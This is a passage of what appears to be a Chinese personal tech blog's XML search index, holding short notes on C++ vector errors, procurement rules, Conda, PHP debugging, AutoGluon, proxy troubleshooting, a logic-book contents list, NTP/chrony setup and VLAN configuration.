]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>__acrt_first_block==header错误的原因及解决方法</title>
    <url>/2025/04/17/acrt-first-block-header%E9%94%99%E8%AF%AF%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>同样遇到以下链接所示错误：</p>
<ul>
<li><a href="https://blog.csdn.net/hansen_fu/article/details/82910521" target="_blank" rel="noopener">__acrt_first_block == header错误的一种办法</a></li>
</ul>
<p>通过单步跟踪，定位到运行函数 std::vector<Object>.push_back(Object)时，就报__acrt_first_block==header错误。最终通过给std::vector<Object>对象预留内存解决，即在调用push_back()前先调用reserve()。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/hansen_fu/article/details/82910521" target="_blank" rel="noopener">__acrt_first_block == header错误的一种办法</a>,by hansen_fu.</li>
<li><a href="https://blog.csdn.net/weixin_45824067/article/details/131114665" target="_blank" rel="noopener">vector 的push_back() 报错</a>,by 爱钓鱼的歪猴.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>采购管理知识学习笔记</title>
    <url>/2025/04/23/%E9%87%87%E8%B4%AD%E7%AE%A1%E7%90%86%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>项目采购管理包括从项目团队外部采购或获取所需产品、服务或成果的各个过程。</p>
</blockquote>
<h1 id="项目采购管理过程"><a href="#项目采购管理过程" class="headerlink" title="项目采购管理过程"></a>项目采购管理过程</h1><p>项目采购管理过程包括：</p>
<ul>
<li>规划采购管理</li>
<li>实施采购</li>
<li>控制采购</li>
</ul>
<h2 id="规划采购管理"><a href="#规划采购管理" class="headerlink" title="规划采购管理"></a>规划采购管理</h2><p>规划采购管理是记录采购决策、明确采购方法，及识别潜在卖方的过程。</p>
<h2 id="实施采购"><a href="#实施采购" class="headerlink" title="实施采购"></a>实施采购</h2><p>实施采购是获取卖方应答、选择卖方并授予合同的过程。</p>
<h3 id="评标委员会"><a href="#评标委员会" class="headerlink" title="评标委员会"></a>评标委员会</h3><p>第二章 评标委员会</p>
<p>第七条 评标委员会依法组建，负责评标活动，向招标人推荐中标候选人或者根据招标人的授权直接确定中标人。</p>
<p>第八条 评标委员会由招标人负责组建。评标委员会成员名单一般应于开标前确定。评标委员会成员名单在中标结果确定前应当保密。</p>
<p>第九条 评标委员会由招标人或其委托的招标代理机构熟悉相关业务的代表，以及有关技术、经济等方面的专家组成，成员人数为五人以上单数，其中技术、经济等方面的专家不得少于成员总数的三分之二。</p>
<p>评标委员会设负责人的，评标委员会负责人由评标委员会成员推举产生或者由招标人确定。评标委员会负责人与评标委员会的其他成员有同等的表决权。</p>
<p><strong>注：评标委员会负责人很重要，负责评标过程节奏的把控，成员工作的分配，因此应当由经验丰富、德高望重的老前辈负责。</strong></p>
<h3 id="评标的准备与初步评审"><a href="#评标的准备与初步评审" class="headerlink" title="评标的准备与初步评审"></a>评标的准备与初步评审</h3><p>第三章 评标的准备与初步评审</p>
<p>第二十二条 投标人资格条件不符合国家有关规定和招标文件要求的，或者拒不按照要求对投标文件进行澄清、说明或者补正的，评标委员会可以否决其投标。</p>
<p>第二十三条 评标委员会应当审查每一投标文件是否对招标文件提出的所有实质性要求和条件作出响应。未能在实质上响应的投标，应当予以否决。</p>
<p><strong>注：本阶段评标委员会将对投标人资质和合规性进行审查。</strong></p>
<h3 id="详细评审"><a href="#详细评审" class="headerlink" title="详细评审"></a>详细评审</h3><p>第四章 详细评审</p>
<p>第二十八条 经初步评审合格的投标文件，评标委员会应当根据招标文件确定的评标标准和方法，对其技术部分和商务部分作进一步评审、比较。</p>
<p><strong>注：本阶段评标委员将依据评估标准和方法对招标文件进行详细评审。评估标准可分为客观部分和主观部分。客观部分由可量化的评估标准构成，因此，对同一份招标文件，所有评标委员会成员的打分应该是一致的，评标委员会负责人可以在此处进行成员分工。</strong></p>
<h2 id="控制采购"><a href="#控制采购" class="headerlink" title="控制采购"></a>控制采购</h2><p>控制采购是管理采购关系、监督合同绩效、实施必要的变更和纠偏，以及关闭合同的过程。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/36318985/" target="_blank" rel="noopener">信息系统项目管理师教程（第4版）</a>,by douban.</li>
<li><a href="https://zfxxgk.ndrc.gov.cn/upload/images/20227/20227191550390.pdf" target="_blank" rel="noopener">评标委员会和评标方法暂行规定</a>,by gov.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>项目管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Conda使用帮助</title>
    <url>/2025/06/24/Conda%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>最近学习《动手学深度学习》第二版这本书，里面用到 miniconda，因此记录一下 Conda 使用方法。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Conda是一个开源跨平台语言无关的包管理与环境管理系统。由“连续统分析”（Continuum Analytics）基于BSD许可证发布。<br>Conda允许用户方便地安装不同版本的二进制软件包与该计算平台需要的所有库。还允许用户在不同版本的包之间切换、从一个软件仓库下载包并安装。<br>Conda是用Python语言开发，但能管理其他编程语言的项目（如R语言），包括多语言项目。 Conda可安装Python语言的包，类似于其他基于Python的跨平台包管理器（如wheel 或pip）。</p>
</blockquote>
<p>Miniconda 是 Anaconda Distribution 的免费微型安装，仅包含 conda、Python、它们所依赖的软件包以及少量其他有用的软件包。</p>
<p>如果您需要更多软件包，请使用conda install命令从 Anaconda 公共存储库中默认提供的数千个软件包中进行安装，或者从其他渠道（如 conda-forge 或 bioconda）进行安装。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>conda 分为 anaconda 和 miniconda，anaconda 是一个包含了许多常用库的集合版本，miniconda 是精简版本（只包含conda、pip、zlib、python 以及它们所需的包），剩余的通过 conda install command 命令自行安装即可；</p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">conda create --name &lt;env_name&gt; python&#x3D;&lt;version&gt; [package_name1] [package_name2] [...]</span><br><span class="line"># 样例 创建一个名为PaddleOCR的环境，python版本为3.7</span><br><span class="line">conda create --name PaddleOCR python&#x3D;3.7</span><br></pre></td></tr></table></figure>

<h2 id="切换Conda环境"><a href="#切换Conda环境" class="headerlink" title="切换Conda环境"></a>切换Conda环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">conda activate env_name</span><br><span class="line"># 样例 切换到PaddleOCR环境</span><br><span class="line">conda activate PaddleOCR</span><br><span class="line"># 退出当前环境</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure>

<h2 id="查看电脑上已安装的Conda环境"><a href="#查看电脑上已安装的Conda环境" class="headerlink" title="查看电脑上已安装的Conda环境"></a>查看电脑上已安装的Conda环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看当前电脑上所有的conda环境</span><br><span class="line">conda env list</span><br><span class="line"></span><br><span class="line"># 激活指定conda环境</span><br><span class="line">conda activate d2l</span><br><span class="line"></span><br><span class="line"># 切换到目录</span><br><span class="line">cd &#x2F;d i:&#x2F;learn&#x2F;d2l-zh</span><br><span class="line"></span><br><span class="line"># 运行jupyter </span><br><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>

<h2 id="删除某个Conda环境"><a href="#删除某个Conda环境" class="headerlink" title="删除某个Conda环境"></a>删除某个Conda环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">conda remove --name &lt;env_name&gt; --all</span><br><span class="line"># 样例</span><br><span class="line">conda remove --name PaddleOCR --all</span><br></pre></td></tr></table></figure>

<h2 id="使用Conda安装依赖包"><a href="#使用Conda安装依赖包" class="headerlink" title="使用Conda安装依赖包"></a>使用Conda安装依赖包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看当前conda环境安装的所有依赖包</span><br><span class="line">conda list</span><br><span class="line"></span><br><span class="line"># 语法</span><br><span class="line">conda install lib</span><br><span class="line"># 样例</span><br><span class="line">conda install requests</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/zhangruifeng/p/16425278.html" target="_blank" rel="noopener">Conda 使用教程</a>,by zhangruifeng.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/Conda" target="_blank" rel="noopener">Conda </a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/ViatorSun/article/details/118578818" target="_blank" rel="noopener">「详解」conda 安装与使用</a>,by ViatorSun.</li>
<li><a href="https://blog.csdn.net/cai454692590/article/details/84672385" target="_blank" rel="noopener">使用Anaconda管理多个版本的Python环境</a>,by 今天只卖大白菜.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php调试方法</title>
    <url>/2025/06/24/php%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>公司一个遗留门户网站需要定期维护，经常需要调试才能确定出问题的地方，因此研究一下php调试的方法，记录一下。</p>
<p><strong>注：该网站使用 php 开发，并采用前后端分离的架构。</strong></p>
<h1 id="通过浏览器打印信息进行调试"><a href="#通过浏览器打印信息进行调试" class="headerlink" title="通过浏览器打印信息进行调试"></a>通过浏览器打印信息进行调试</h1><p>在代码中添加 echo、var_dump、print_r 和 exit，在浏览器中查看输出。该方法不适用采用前后端分离架构的门户网站，因为前端通过restful api 访问后端，后端产生的结果不直接显示在浏览器网页中。</p>
<h1 id="使用-XDebug-进行调试"><a href="#使用-XDebug-进行调试" class="headerlink" title="使用 XDebug 进行调试"></a>使用 XDebug 进行调试</h1><p>Xdebug 是一款PHP 的调试工具，可以帮助开发者追踪、调试和分析PHP 程序的运行状况。它允许开发者在代码中设置断点，单步执行代码，查看变量值等，从而更有效地排查和解决问题。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/kikajack/article/details/81014804" target="_blank" rel="noopener">PHP 调试 - 方式</a>,by kikajack.</li>
<li><a href="https://www.cnblogs.com/GeekerJun/p/14905784.html" target="_blank" rel="noopener">Xdebug+phpStorm安装与调试保姆级教程!『通俗易懂』</a>,by GeekerJun.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>AutoGluon使用帮助</title>
    <url>/2025/07/23/AutoGluon%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>最近在看李沐大神的动手学深度学习的视频，看到大神努力地推荐AutoGluon，说它能够让普通人很容易上手使用深度学习模型，因此学习一下。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>AutoGluon由AWS AI开发，自动化机器学习任务，使您能够轻松地在应用程序中实现强大的预测性能。只需几行代码，您就可以在图像、文本、时间序列和表格数据上训练和部署高精度的机器学习和深度学习模型。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用conda创建一个环境，再在该环境上安装AutoGluon。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda create -n autogluon python&#x3D;3.11</span><br><span class="line">conda activate autogluon</span><br><span class="line">conda install -c conda-forge mamba</span><br><span class="line">mamba install -c conda-forge -c pytorch -c nvidia autogluon &quot;pytorch&#x3D;*&#x3D;*cuda*&quot;</span><br><span class="line">mamba install -c conda-forge &quot;ray-tune &gt;&#x3D;2.10.0,&lt;2.32&quot; &quot;ray-default &gt;&#x3D;2.10.0,&lt;2.32&quot;  # install ray for faster training</span><br></pre></td></tr></table></figure>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>使用如下代码快速演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from autogluon.tabular import TabularPredictor</span><br><span class="line">predictor &#x3D; TabularPredictor(label&#x3D;&quot;class&quot;).fit(&quot;train.csv&quot;)</span><br><span class="line">predictions &#x3D; predictor.predict(&quot;test.csv&quot;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://aws.amazon.com/cn/blogs/china/machine-learning-with-autogluon-an-open-source-automl-library/" target="_blank" rel="noopener">使用开源 AutoML 库 AutoGluon 进行机器学习</a>,by Shashank Prasanna.</li>
<li><a href="https://zhuanlan.zhihu.com/p/682380256" target="_blank" rel="noopener">AutoGluon，一个强大的 Python 库</a>,by 算法金.</li>
<li><a href="https://blog.csdn.net/wish_to_top/article/details/117999594" target="_blank" rel="noopener">AutoGluon-教程1-简单的入门模型</a>,by 愿航.</li>
<li><a href="https://github.com/autogluon/autogluon" target="_blank" rel="noopener">autogluon</a>,by github.</li>
<li><a href="https://auto.gluon.ai/stable/install.html" target="_blank" rel="noopener">Installing AutoGluon</a>,by autogluon.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>一起因代理设置不当导致网站无法访问的排故记录</title>
    <url>/2025/08/02/%E4%B8%80%E8%B5%B7%E5%9B%A0%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%BD%91%E7%AB%99%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E7%9A%84%E6%8E%92%E6%95%85%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>最近公司遇到一起网站无法访问的故障，记录一下排骨过程。</p>
<h1 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h1><p>某工位人员电脑突然无法访问公司 web 服务器上部署的网站。</p>
<h1 id="排故过程"><a href="#排故过程" class="headerlink" title="排故过程"></a>排故过程</h1><ol>
<li>其他工位人员能够访问公司 web 服务器上部署的网站，说明非 web 服务器原因。</li>
<li>目标工位人员电脑能够 ping 通 web 服务器，说明底层通信链路完好，无法访问是该工位人员电脑自身原因。</li>
<li>关闭目标工位人员电脑防火墙，仍旧不能访问，说明与防火墙阻挡无关。</li>
<li>检查网络代理。最终通过 wireshark 抓包查明是该工位人员电脑设置<strong>网络代理</strong>，导致无法访问公司 web 服务器。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">代理服务器</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑学入门读书笔记</title>
    <url>/2025/09/14/%E9%80%BB%E8%BE%91%E5%AD%A6%E5%85%A5%E9%97%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>为了更好的有效的沟通，及时准确的发现对方言语中的逻辑谬误，以便有理有据精准反驳，学习一点逻辑学知识是非常有必要的。阅读格桑老师的《逻辑学入门》，做点读书笔记。</p>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>001 01. “老师，我不认识孙中山” 偷换概念<br>003 02. “买一送一，原来是这样的啊” 混淆概念<br>005 03. “你说的千里马，明明就是蛤蟆嘛” 模糊概念<br>007 04. “所有的天鹅都应该是白色的” 归纳谬误<br>009 05. “为什么总会有人将错就错” 协和谬误<br>011 06. “上不了好学校，将来就会学坏吗” 滑坡谬误<br>013 07. “我就不信我赢不了” 赌徒谬误<br>015 08. “贫穷和疾病不是偷窃的理由” 诉诸怜悯<br>017 09. “多数人认为对的，不一定是真理” 诉诸大众<br>019 10. “我一直躺着看书，也没有近视” 诉诸个体<br>020 11. “经验这个东西，并非都那么可靠” 诉诸经验<br>022 12. “没人能证明你是对的，所以别跟我争辩” 诉诸无知<br>024 13. “请你相信我，那只是一个例外” 诉诸规则以外<br>025 14. “如果做不到完美，就干脆不要做” 诉诸完美<br>027 15. “我只是偷了东西，又没有伤人” 诉诸最差<br>029 16. “如果你不相信，我说了也没用” 诉诸信心<br>031 17. “卧室里放这个，全家得癌症” 诉诸恐惧<br>033 18. “你说喝酒对身体不好，你不也喝吗” 诉诸反诘<br>035 19. “不说话，肯定就是你弄坏的” 诉诸沉默<br>037 20. “如果你不想被开除，就得遵守这一规则” 诉诸势力<br>040 21. “无利不早起，他这么做一定有所图” 动机论<br>042 22. “这是名人说的，难道也是错的吗” 诉诸权威<br>044 23. “谎言重复一千遍，也不会变成真理” 重复谎言<br>046 24. “开这么好的车，肯定是父母有钱” 强制推理<br>047 25. “太阳傍晚下山，是因为保姆阿姨回家了” 因果混淆<br>049 26. “挂一个鸟笼，就一定要养鸟吗” 惯性思维<br>051 27. “有其父必有其子，是不是真的呢” 诉诸出身<br>053 28. “我的鸡蛋是臭的？你才是臭的呢” 诉诸人身<br>055 29. “有意义就是好好活，好好活就是做有意义的事” 循环论证<br>058 30. “再逼真的稻草人，也不是真实的人” 稻草人谬误<br>060 31. “骆驼挂铃铛和高塔挂铃铛，不是一回事” 转移论题<br>063 32. “刻舟求剑的楚国人，到底错在哪儿了” 诉诸感觉<br>066 33. “你的假设有问题，别想误导我” 预设谬误<br>071 34. “这样的结果很可怕，你掂量掂量” 诉诸后果<br>074 35. “我不想出国，所以没必要学英语” 否定前件<br>077 36. “东施效颦，为什么越闹越丑” 机械类比<br>079 37. “如果再给我一次机会，我一定……” 无理假设<br>081 38. “双重否定等于肯定，是这样的吗” 双否定前提<br>083 39. “所有的天鹅，都有白色的羽毛” 不当周延<br>085 40. “所有的科莱特人都是说谎者” 罗素悖论<br>088 41. “鲍西亚的肖像藏在哪个匣子中” 排中律<br>091 42. “为什么是这样，而不是那样呢” 充足理由律<br>093 43. “妈妈，师范大学在哪儿呢？” 范畴错误<br>095 44. “天才是1%的灵感加上99%的汗水” 断章取义<br>097 45. “嗯？有两个报社的记者参加……” 结构歧义<br>099 46. “那里的老鼠没有一只是驼背的” 隐含命题<br>102 47. “套用你的话，看你还能怎么狡辩” 同构意悖<br>105 48. “说了半天，跟什么都没说一样” 分解问题<br>108 49. “不是这个，就是那个，没有中间物” 虚假两分<br>111 50. “你如何知道它是真的，能证明吗” 事实断言<br>114 51. “只要支付全款的10%就行了” 隐瞒证据<br>117 52. “不好直接回答时，就回答点别的” 答非所问<br>119 53. “什么是‘正’，什么是‘不正’” 绝对化谬误<br>122 54. “诡辩家的半费之讼，你看懂了吗” 二难诡辩术<br>127 55. “导致这种结果的原因只有一个吗” 简化因果关系<br>129 56. “中国人民银行的资金有18元8角8分” 故意歪解<br>131 57. “阴沉着脸，是因为心情不好” 命名谬误<br>133 58. “小明是小明爸爸的儿子” 同语反复<br>135 59. “明天约好了去爬山，所以明天肯定是晴天” 一厢情愿<br>137 60. “所有男人都喜欢看世界杯吗” 区群谬误<br>139 61. “说不上来，就是有一种感觉” 直觉思维<br>141 62. “这个项目结束后，起码能赚二三十万” 预期理由<br>143 63. “萧敬腾一开演唱会，肯定会下雨” 巧合谬误<br>145 64. “给懒惰的农民发两头牛，他们就勤奋了” 因果倒置<br>148 65. “夸奖让学生成绩下降，责骂让学生成绩进步” 回归谬误<br>150 66. “和尚动得，为何我动不得” 推不出来<br>151 67. “下半年有富余的话，我肯定借给你” 设定条件<br>153 68. “抽烟会影响空气质量，赶紧戒了吧” 无足轻重<br>155 69. “自古以来，家务活都是女人做的” 诉诸传统<br>158 70. “我们该为别人的盲目行为负责吗” 说即劝说<br>160 71. “狂放之士，用他有什么益处呢” 以人为据<br>162 72. “盗书，怎么能算是偷呢” 说文解字<br>165 73. “你的动作总是出错，不是跳舞的料” 过度引申<br>167 74. “人的眼睛有5.76亿像素，却终究看不懂人心” 不当类比<br>170 75. “眼见都不一定为实，更何况道听途说呢” 诉诸传言<br>171 76. “本命年穿红色衣服，就会有好运吗” 破除迷信<br>173 77. “简单答案？算了吧……” 简单答案不存在<br>175 78. “思维卡壳的时候，你该怎么办” 触类旁通<br>177 79. “能不能把话说得明白一点儿” 中性词语<br>179 80. “打破砂锅问到底，直至找出满意的答案” 追踪思维<br>181 81. “葡萄那么酸，我才不想吃呢” 合理化<br>183 82. “是团体中的成员太蠢了” 集体思维<br>186 83. “你不认为这么想是合理的吗” 诱导性问题<br>188 84. “把最胖的那位科学家丢出去” 求易思维<br>190 85. “组合的力量是无穷的……” 组合思维<br>192 86. “我喊‘3’的时候大家一起睁开眼” 逆向思维<br>194 87. “下次不下雨的时候，献祭活人就是了” 在此之后<br>196 88. “抽维珍妮细烟能让女性身材变纤细吗” 固定联想</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/35329710/" target="_blank" rel="noopener">逻辑学入门</a>,by 格桑.</li>
<li><a href="https://www.scribd.com/document/737981232/2020-09-%E9%80%BB%E8%BE%91%E5%AD%A6%E5%85%A5%E9%97%A8" target="_blank" rel="noopener">逻辑学入门</a>,by scribd.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>逻辑学</tag>
      </tags>
  </entry>
  <entry>
    <title>NTP时间同步设置方法</title>
    <url>/2025/09/20/NTP%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>对于分布式系统的运转而言，各个分布式的实体基于同一时间标准是必要条件，如果各个分布式实体的时间标准不统一，整个系统必然分崩离析。下面介绍在不同操作系统平台设置 NTP 客户端的方法。</p>
<h1 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h1><ul>
<li>设置 NTP 时间服务器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打开日期和时间设置</span><br><span class="line"></span><br><span class="line">找到Internet时间设置</span><br><span class="line"></span><br><span class="line">选择NTP服务器并同步</span><br></pre></td></tr></table></figure>

<ul>
<li>调整时间同步频率</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打开注册表编辑器（regedit）。</span><br><span class="line"></span><br><span class="line">导航到 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient。</span><br><span class="line"></span><br><span class="line">找到名为 SpecialPollInterval 的DWORD值，双击打开，在“数值数据”中填入期望的同步间隔（以秒为单位）即可调整同步频率。</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> SpecialPollInterval 值的设置必须在位于 MinPollInterval 和 MaxPollInterval 之间，否则 NTP 客户端不会按 SpecialPollInterval 预期同步。具体请参考：<a href="https://www.sohu.com/a/817704068_120400677" target="_blank" rel="noopener">京准电钟课堂：NTP时钟同步时客户端未按预期同步 </a>。</p>
<h1 id="Linux平台"><a href="#Linux平台" class="headerlink" title="Linux平台"></a>Linux平台</h1><blockquote>
<p>chrony 既可作时间服务器服务端，也可作客户端。性能比 ntp 好，且配置管理方便。chrony 由两个程序组成，分别是 chronyd 和 chronyc。chronyd 是一个后台运行的守护进程，用于调整内核中运行的系统时钟和时钟服务器同步。它确定计算机增减时间的比率，并对此进行补偿。chronyc 提供了一个用户界面，用于监控性能并进行多样化的配置。它可以在 chronyd 实例控制的计算机上工作，也可以在一台不同的远程计算机上工作。</p>
</blockquote>
<p>以 NTP 工具 Chrony 为例，具体步骤如下：</p>
<ul>
<li>安装chrony</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看 chrony 依赖的包</span><br><span class="line">apt-cache depends chrony</span><br><span class="line"></span><br><span class="line"># 安装chrony，观察chrony依赖的包</span><br><span class="line">sudo apt-get install chrony</span><br><span class="line"></span><br><span class="line"># 下载 chrony及其依赖包</span><br><span class="line">apt-get download chrony </span><br><span class="line"></span><br><span class="line"># 离线安装chrony</span><br><span class="line">sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure>


<ul>
<li>修改配置文件 /etc/chrony/chrony.conf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注释默认的 NTP 服务器pool，配置上级时间服务器</span><br><span class="line">server 192.168.1.30 iburst</span><br></pre></td></tr></table></figure>

<ul>
<li>重启chrony服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 获取 chronyd 的PID</span><br><span class="line">pgrep chronyd</span><br><span class="line"></span><br><span class="line"># 直接终止（推荐）</span><br><span class="line">kill &lt;chronyd的PID&gt;</span><br><span class="line"></span><br><span class="line"># 强制终止（如果进程没有响应）</span><br><span class="line">kill -9 &lt;chronyd的PID&gt;</span><br><span class="line"></span><br><span class="line"># 启动 chronyd</span><br><span class="line">sudo  chronyd</span><br></pre></td></tr></table></figure>

<ul>
<li>查看并等待与NTP服务器同步</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 确保你的chrony服务器自身已经成功与上层服务器同步。可以通过 chronyc sources 命令检查，服务端需要先成功同步时间，才能为客户端提供同步服务, NTP服务器前设置 ^* 表示已与该服务区时钟同步。</span><br><span class="line"></span><br><span class="line">chronyc sources -v</span><br><span class="line">chronyc sourcestats -v</span><br></pre></td></tr></table></figure>

<ul>
<li>手动同步NTP客户端时间</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chronyc -a makestep</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2024/10/30/NTP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">NTP协议学习笔记</a>,by jackhaung.</li>
<li><a href="https://blog.csdn.net/hulangbotufei/article/details/125253825" target="_blank" rel="noopener">WINDOWS 10如何配置NTP服务（Server&amp;Client）</a>,by 胡浪波.</li>
<li><a href="https://zhuanlan.zhihu.com/p/364727871" target="_blank" rel="noopener">windows系统时间同步及同步频率设置</a>,by li88811.</li>
<li><a href="https://zhuanlan.zhihu.com/p/18898283639" target="_blank" rel="noopener">第三章：ubuntu 24.04.1 ntp服务安装</a>,by 王小二.</li>
<li><a href="https://www.cnblogs.com/lsgxeva/p/14265513.html" target="_blank" rel="noopener">Ubuntu部署NTP服务器和客户端</a>,by lsgxeva.</li>
<li><a href="https://www.sohu.com/a/817704068_120400677" target="_blank" rel="noopener">京准电钟课堂：NTP时钟同步时客户端未按预期同步 </a>, by 安徽京准2024.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Vlan配置方法</title>
    <url>/2025/09/22/Vlan%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近单位有一台计算机，只有一个网卡，但是需要通三个网段通信，为了避免各个网段之间的组播通信流量占用带宽，拟采用Vlan技术，使用三次交换机进行逻辑隔离。具体过程记录如下。</p>
<h1 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h1><p>使用 VLAN 接口。</p>
<p>核心思想是：在计算机的网络接口上创建多个虚拟接口，并将每个虚拟接口关联到不同的VLAN。</p>
<p>这种方法适用于支持802.1Q VLAN标记的交换机和操作系统。它在单个物理网卡上创建多个逻辑接口。</p>
<ul>
<li><p>物理连接：服务器通过一根网线连接到支持802.1Q的交换机端口。该交换机端口需要被配置为Trunk模式，允许携带多个VLAN的流量。</p>
</li>
<li><p>服务器端配置：在服务器的操作系统上，你需要创建VLAN虚拟接口。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line"></span><br><span class="line">物理网卡名：eth0</span><br><span class="line"></span><br><span class="line">创建的虚拟接口：</span><br><span class="line"></span><br><span class="line">eth0.10 (对应VLAN 10)</span><br><span class="line"></span><br><span class="line">eth0.20 (对应VLAN 20)</span><br><span class="line"></span><br><span class="line">eth0.30 (对应VLAN 30)</span><br></pre></td></tr></table></figure>

<p>对于Realtek网卡，可使用realtek diagnostic utility工具，创建多个vlan网口。具体请参考 <a href="https://www.cnblogs.com/weihua2020/p/14151012.html" target="_blank" rel="noopener">realtek adapter的vlan设定</a>。</p>
<ul>
<li>IP地址分配：为每个虚拟接口分配一个属于相应VLAN网段的IP地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth0.10 -&gt; 192.168.10.100&#x2F;24 (VLAN 10的网关可能是 192.168.10.1)</span><br><span class="line"></span><br><span class="line">eth0.20 -&gt; 192.168.20.100&#x2F;24 (VLAN 20的网关可能是 192.168.20.1)</span><br><span class="line"></span><br><span class="line">eth0.30 -&gt; 192.168.30.100&#x2F;24 (VLAN 30的网关可能是 192.168.30.1)</span><br></pre></td></tr></table></figure>

